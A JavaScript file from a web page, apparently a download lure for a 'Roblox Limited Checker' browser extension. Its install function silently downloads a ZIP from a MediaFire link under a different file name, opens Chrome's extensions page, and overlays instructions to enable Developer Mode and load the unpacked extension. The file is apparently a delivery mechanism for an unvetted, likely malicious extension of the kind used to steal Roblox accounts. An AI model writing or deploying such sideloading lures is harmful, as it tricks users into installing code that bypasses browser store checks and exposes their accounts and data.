function installExtension() {
    // Automatic download with direct MediaFire link
    const link = document.createElement('a');
    link.href = 'https://download1589.mediafire.com/pb2bqgwym4mgez3-Q6lpITxtzjwR_r_3anEq8Qclr6Sb2zWFICY_8cJZKno6zUxeIazFDUCPWegg6_drFY876HCmZNhIn8qV5KxbvY69yDZHZu7ccg_VtVjqdyFvnGZNtUqAU-dJJowAucCmFiEGfnW1VPzwaDMRdVt4rHidXDeX/dxv40xz6wrq6oxa/Roblox+Limited+Checker.zip';
    link.download = 'Roblox_Poison_Checker.zip';
    link.style.display = 'none';
    
    // Trigger automatic download
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    // Open extensions page in new tab
    setTimeout(() => {
        window.open('chrome://extensions/', '_blank');
    }, 1000);
    
    // Show installation instructions
    setTimeout(() => {
        showInstallationGuide();
    }, 1500);
}

function showInstallationGuide() {
    const guide = document.createElement('div');
    guide.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 31, 63, 0.95);
        color: white;
        z-index: 10000;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: Arial, sans-serif;
    `;
    
    guide.innerHTML = `
        <div style="background: #00264d; padding: 40px; border-radius: 10px; max-width: 600px; text-align: center; border: 2px solid #4CAF50;">
            <h2 style="color: #4CAF50; margin-bottom: 20px;">🚀 Installation Started</h2>
            
            <div style="text-align: left; margin-bottom: 30px;">
                <div style="display: flex; align-items: center; margin: 15px 0;">
                    <div style="background: #4CAF50; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">✓</div>
                    <div>
                        <strong>Download Started Automatically</strong>
                        <p style="margin: 5px 0 0 0; color: #ccc;">ZIP file is downloading to your computer</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; margin: 15px 0;">
                    <div style="background: #4CAF50; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">✓</div>
                    <div>
                        <strong>Extensions Page Opened</strong>
                        <p style="margin: 5px 0 0 0; color: #ccc;">New tab with chrome://extensions/</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; margin: 15px 0;">
                    <div style="background: #2196F3; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">1</div>
                    <div>
                        <strong>Extract ZIP File</strong>
                        <p style="margin: 5px 0 0 0; color: #ccc;">Right-click → "Extract All" to a folder</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; margin: 15px 0;">
                    <div style="background: #2196F3; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">2</div>
                    <div>
                        <strong>Enable Developer Mode</strong>
                        <p style="margin: 5px 0 0 0; color: #ccc;">Toggle the switch (top-right corner)</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; margin: 15px 0;">
                    <div style="background: #2196F3; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">3</div>
                    <div>
                        <strong>Load Extension</strong>
                        <p style="margin: 5px 0 0 0; color: #ccc;">Click "Load unpacked" → Select extracted folder</p>
                    </div>
                </div>
            </div>
            
            <div style="background: #001f3f; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: left;">
                <strong>💡 Quick Tip:</strong> Check your downloads folder for "Roblox_Poison_Checker.zip"
            </div>
            
            <button onclick="this.parentElement.parentElement.remove()" style="background: #4CAF50; color: white; border: none; padding: 12px 30px; border-radius: 5px; cursor: pointer; font-size: 16px;">
                Got It - Close Instructions
            </button>
        </div>
    `;
    
    document.body.appendChild(guide);
}

// Smooth animations (keep this part)
document.addEventListener('DOMContentLoaded', function() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    });

    document.querySelectorAll('.feature-card').forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        card.style.transition = 'all 0.6s ease';
        observer.observe(card);
    });
});